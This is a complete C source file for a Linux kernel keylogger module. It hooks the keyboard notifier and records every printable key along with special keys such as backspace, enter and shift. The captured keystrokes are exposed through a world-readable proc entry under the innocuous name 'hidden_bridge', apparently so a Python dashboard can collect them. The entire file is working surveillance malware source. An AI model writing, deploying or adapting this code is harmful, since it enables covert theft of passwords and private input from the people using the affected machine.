/**
 * @file keylogger.c
 * @brief Kernel space keylogger module.
 *
 * Captures keyboard events and exposes them to user space via a procfs entry.
 * 
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/keyboard.h>
#include <linux/input-event-codes.h>

#define PROC_NAME "hidden_bridge"
#define STATUS_BUF_SIZE 128
#define LOG_BUF_SIZE 1024

static struct proc_dir_entry *proc_file;
static char key_buffer[LOG_BUF_SIZE]; // Buffer to store a sequence of keys
static int key_index = 0; // Tracks how many keys were stored so far

/**
 * @brief Reads captured keys from the proc file (kernelspace) to user space.
 * 
 * Copies the current key buffer to the user space buffer and resets the internal buffer so only new keys are sent next time.
 * 
 * @param file  Pointer to the open proc file
 * @param buf   Userspace buffer where we copy the keys to
 * @param count How many bytes user wants to read
 * @param ppos  Pointer to the current position in the file
 * @return The number of bytes read, 0 if empty, or -EFAULT if copying fails
 */
static ssize_t keylogger_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) // callback function
{
    int len = key_index; // Only the bytes that were filled

    if (*ppos > 0)
    {
        return 0;
    }

    if (len == 0)
    {
        return 0;
    }

    if (copy_to_user(buf, key_buffer, len)) // Move the raw keylogs to user space
    {
        return -EFAULT;
    }

    // After a read - clean buffer so we only send new keys next time
    memset(key_buffer, 0, sizeof(key_buffer));
    key_index = 0;

    *ppos = len;
    return len;
}

static const struct proc_ops keylogger_proc_ops =
{
    .proc_read = keylogger_read, // Tell the proc filesystem to use my read function when someone cat's the file (callback)
};

/**
 * @brief Appends one char to the key buffer
 * 
 * Checks if there is space left in the buffer before adding the character and incrementing the index
 * 
 * @param c The character to append
 */
static void append_char(char c)
{
    if (key_index < LOG_BUF_SIZE - 1)
    {
        key_buffer[key_index] = c;
        key_index++;
    }
}

/**
 * @brief Appends a string token to the key buffer
 * 
 * Loops through the token and appends each char of it
 * until the null terminator is reached or the buffer is full
 * 
 * @param token Pointer to the string to append
 */
static void append_token(const char *token)
{
    int i;

    for (i = 0; token[i] != '\0'; i++)
    {
        if (key_index >= LOG_BUF_SIZE - 1)
        {
            break;
        }

        key_buffer[key_index] = token[i];
        key_index++;
    }
}

/**
 * @brief Logs printable ASCII characters
 * 
 * Filters for standard ASCII characters and escapes brackets to help the Python dashboard parse them later
 * 
 * @param v The key value to log
 */
static void log_printable(unsigned int v)
{
    char c = (char)v;

    // ASCII space to ~
    if (c >= 0x20 && c <= 0x7E)
    {
        if (c == '[' || c == ']') // for python to handle incase user types '[' / ']'
        {
            append_char('\\'); // take the actual "\" (not the special escape \ (\n)) and append char as "\[" or "\]"
        }
        append_char(c);
    }
}

/**
 * @brief Logs special action keys as string tokens
 * 
 * Translates raw pre kernel keycodes into readable tokens
 * for tracking actions like enter, backspace, and shift
 * 
 * @param keycode The raw keycode from the keyboard
 */
static void log_special_key(unsigned int keycode)
{
    switch (keycode)
    {
        case KEY_BACKSPACE:
            append_token("[BS]");
            break;

        case KEY_ENTER:
            append_char('\n');
            break;

        case KEY_DELETE:
            append_token("[DEL]");
            break;

        case KEY_TAB:
            append_token("[TAB]");
            break;

        case KEY_ESC:
            append_token("[ESC]");
            break;

        case KEY_LEFTSHIFT:
        case KEY_RIGHTSHIFT:
            append_token("[SHIFT]");
            break;

        case KEY_CAPSLOCK:
            append_token("[CAPS]");
            break;

        default:
            break;
    }
}

/**
 * @brief Callback function triggered by keyboard events
 * 
 * Only key press down events and routes key presses to either 
 * special key logging or printable character logging based on the event code
 * 
 * @param nblock Pointer to the notifier block nb
 * @param code   The type of keyboard event (keycode, keysym, unicode)
 * @param _param Pointer to the keyboard notifier parameters
 * @return NOTIFY_OK to let the kernel continue processing the event normally
 */
static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param; // Cast the generic void pointer to the keyboard parameter struct

    if (!param->down)
    {
        return NOTIFY_OK;
    }

    switch (code)
    {
        case KBD_KEYCODE:
            log_special_key(param->value); // actions
            break;

        case KBD_UNICODE:
        case KBD_KEYSYM:
            log_printable(param->value); // text - same logic for both
            break;
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb =
{
    .notifier_call = keylogger_cb // Tell the keyboard subsystem to call my callback function when a key is pressed
};

/**
 * @brief Initializes the keylogger kernel module
 * 
 * Registers the keyboard notifier to start sniffing keystrokes and 
 * creates a read only proc file for the user space client
 * 
 * @return 0 on success.
 */
static int __init keylogger_init(void)
{
    memset(key_buffer, 0, sizeof(key_buffer)); // Start with an empty log buffer

    register_keyboard_notifier(&keylogger_nb); // Tell Linux to start sending keyboard events to my callback
    proc_file = proc_create(PROC_NAME, 0444, NULL, &keylogger_proc_ops); // 0444 - read only permissions

    printk(KERN_INFO "keylogger: loaded\n"); 
    return 0;
}

/**
 * @brief Cleans up and removes the keylogger module
 * 
 * Unregisters the keyboard notifier and removes the 
 * proc file entry to unload from the kernel
 */
static void __exit keylogger_exit(void)
{
    if (proc_file)
    {
        proc_remove(proc_file);
    }

    unregister_keyboard_notifier(&keylogger_nb); // Tell Linux to stop sending me keyboard events

    printk(KERN_INFO "keylogger: unloaded\n");
}

module_init(keylogger_init); // Tell the compiler which function is the startup hook
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");